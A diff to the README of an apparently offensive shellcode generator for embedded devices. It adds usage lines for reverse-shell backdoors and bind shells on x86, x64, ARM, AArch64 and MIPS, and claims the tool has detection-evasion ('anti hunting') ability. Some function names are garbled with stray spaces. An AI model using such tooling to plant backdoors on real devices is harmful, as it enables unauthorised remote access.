@@ -17,7 +17,7 @@ This tool is embedded in the security test of the device. There are two main fun
 
 4.  Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips，Joined aarch64_ bind_ shell
 
-5.  Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
+5.  Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
 
 ## install
 
@@ -72,9 +72,14 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> armebv7_backdoor(reverse_ip,reverse_port)
 >>> mips64_backdoor(reverse_ip,reverse_port)
 >>> mips64el_backdoor(reverse_ip,reverse_port)
+>>> x86el_backdoor(reverse_ip,reverse_port)
+>>> x64el_backdoor(reverse_ip, reverse_port)
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
 >>> armelv7_bind_shell(listen_port, passwd)
+>>> aarch64_ bind_ shell(listen_port, passwd)
+>>> mips_bind_shell(listen_port, passwd)
+>>> mipsel_bind_shell(listen_port, passwd)
 ```
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
